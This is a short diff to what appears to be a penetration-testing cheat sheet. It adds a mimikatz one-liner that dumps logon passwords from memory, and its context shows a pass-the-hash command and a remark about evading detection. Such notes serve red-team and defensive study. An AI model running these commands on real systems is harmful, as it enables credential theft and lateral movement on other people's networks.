@@ -254,6 +254,12 @@ sekurlsa::pth /user:zensvc /domain:exam.com /ntlm:d098fa8675acd7d26ab86eb2581233
 
 ```
 
+Or as one liner in cmd
+
+```cmd
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+```
+
 
 ```powershell
 # never use mimikatz as a standalone tool as it shall get detected
